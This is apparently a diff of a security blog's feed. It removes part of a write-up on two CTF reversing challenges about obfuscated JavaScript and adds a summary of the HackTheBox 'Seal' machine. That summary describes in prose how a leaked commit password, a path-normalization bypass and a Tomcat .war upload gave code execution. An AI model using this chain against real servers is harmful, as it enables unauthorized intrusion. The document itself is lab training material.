-<p>This challenge provides an obfuscated JavaScript file <code class="language-plaintext highlighter-rouge">message.js</code>, that uses <code class="language-plaintext highlighter-rouge">String.fromCharCode()</code> to load another JavaScript code. The other JavaScript code has a variable named <code class="language-plaintext highlighter-rouge">file</code> that was set to a base64-encoded string. Decoding the string, I got a PDF file that contained the flag;</p>
-
-<p><img src="/assets/img/2021-11-05_18-21.png" alt="" /></p>
-
-<p><br /></p>
-
-<h4 id="context"><strong>ConText</strong></h4>
-
-<p>This challenge provides an obfuscated JavaScript file. It uses a lookup table to decode strings used to reference other things, which I was able to decode using the JS console in Firefox. The JavaScript has a function named <code class="language-plaintext highlighter-rouge">flag()</code> that takes a signle string argument, which must be the ID of a 2D canvas in the current page. It uses the canvas to draw an image, which contains the flag for the challenge;</p>
-
-<p><img src="/assets/img/2021-11-07_09-05.png" alt="" /></p>
-
-<p>So I setup a basic HTML page that loads the script and create a canvas, the ID of which I used to call <code class="language-plaintext highlighter-rouge">flag()</code> in the JS console;</p>
-
-<p><img src="/assets/img/2021-11-07_09-06_1.png" alt="" /></p>
-
-<p><img src="/assets/img/2021-11-07_09-06.png" alt="" /></p>]]></content><author><name></name></author><category term="ctf" /><category term="ctf" /><category term="synack red team" /><category term="hackthebox" /><category term="jeopardy" /><category term="template injection" /><category term="sql injection" /><category term="command injection" /><category term="rsa" /><category term="pwn" /><category term="traffic analysis" /><category term="static analysis" /><category term="reversing" /><summary type="html"><![CDATA[Synack Red Team 5 CTF was (iirc) my third CTF, and the first in which I actually managed to score some decent points. It’s a jeopardy-styled CTF featuring 6 categories (web, pwn, crypto, forensics, misc, and reversing). I managed to solve 16 out of the 25 total challenges, solving at least one challenge in each category. My strongest category was web, in which I solved 5 out of 6 challenges. I eventually finished 46th out of 333 participants, which was narrowly within my target of top 50, and for that I am happy :)]]></summary></entry></feed>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="apache tomcat" /><category term="web proxy" /><category term="git" /><category term="gitbucket" /><category term="open signup" /><category term="path normalization" /><category term="ansible playbook" /><summary type="html"><![CDATA[Seal is a medium linux box. It features a web service on port 443 running Apache Tomcat, and a GitBucket installation running locally, but accessible through the proxy on port 8080 (nginx). The GitBucket allows a user to create an account, which I did. Once inside, I recovered a password in a previous commit in one of the repositories. This credential was accepted by the tomcat admin login page, but access to the panel was blocked by nginx. This was bypassed thanks to a path normalization vulnerability, and the .war upload used to deploy web applications in tomcat was used to gain code execution on the server.]]></summary></entry></feed>
